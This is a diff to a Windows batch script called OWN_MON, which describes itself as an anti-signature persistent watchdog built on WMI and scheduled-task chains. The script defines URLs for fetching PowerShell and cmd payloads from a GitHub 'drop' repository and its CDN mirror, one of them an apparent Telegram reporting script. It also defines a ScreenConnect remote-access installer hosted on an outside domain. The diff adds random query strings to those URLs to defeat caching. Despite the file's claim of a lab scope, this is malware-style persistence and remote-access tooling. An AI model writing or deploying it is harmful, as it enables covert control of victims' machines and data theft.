@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M14
+rem  OWN_MON  BUILD 20260802M15
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -15,14 +15,14 @@ set "LOG=%WD%\own_mon.log"
 set "STATE=%WD%\own_mon.state"
 set "HBFLAG=%WD%\hb.flag"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1"
-set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1"
-set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd"
-set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd"
-set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd"
-set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd"
-set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1"
-set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1"
+set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1?t=%RANDOM%%RANDOM%"
+set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1?t=%RANDOM%%RANDOM%"
+set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
+set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd?t=%RANDOM%%RANDOM%"
+set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
+set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
+set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
+set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "MSI_URL=https://sevrz.com/ScreenConnect.ClientSetup.msi"
 set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
 set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
@@ -31,7 +31,7 @@ set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M14"
+set "MONVER=M15"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
